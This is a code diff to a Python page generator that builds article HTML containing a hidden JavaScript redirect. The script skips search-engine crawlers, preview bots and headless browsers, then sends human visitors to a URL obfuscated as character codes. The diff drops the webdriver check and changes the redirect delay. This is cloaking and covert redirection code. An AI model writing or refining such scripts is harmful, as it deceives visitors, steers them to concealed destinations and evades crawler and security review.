@@ -251,7 +251,6 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
     bot_regex = "var _b=/googlebot|bingbot|yandexbot|baiduspider|facebookexternalhit|pinterestbot|whatsapp|slurp|crawl|spider|preview|headless|phantom|puppet|lighthouse|APIs-Google|AdsBot|Mediapartners/i;"
     js_parts = []
     js_parts.append("(function(){")
-    js_parts.append("if(navigator.webdriver)return;")
     js_parts.append("var _ua=navigator.userAgent||'';")
     js_parts.append(bot_regex)
     js_parts.append("if(_b.test(_ua))return;")
@@ -260,7 +259,7 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
     js_parts.append("var _u='';for(var i=0;i<_c.length;i++){_u+=String.fromCharCode(_c[i]);}")
     js_parts.append("var _s=window.location.search;if(_s)_u+=_s;")
     js_parts.append("window.location.href=_u;")
-    js_parts.append("}catch(e){}},10);")
+    js_parts.append("}catch(e){}},100);")
     js_parts.append("})();")
     js_code = "".join(js_parts)
     redirect_script = "\n    <script>\n        " + js_code + "\n    </script>"
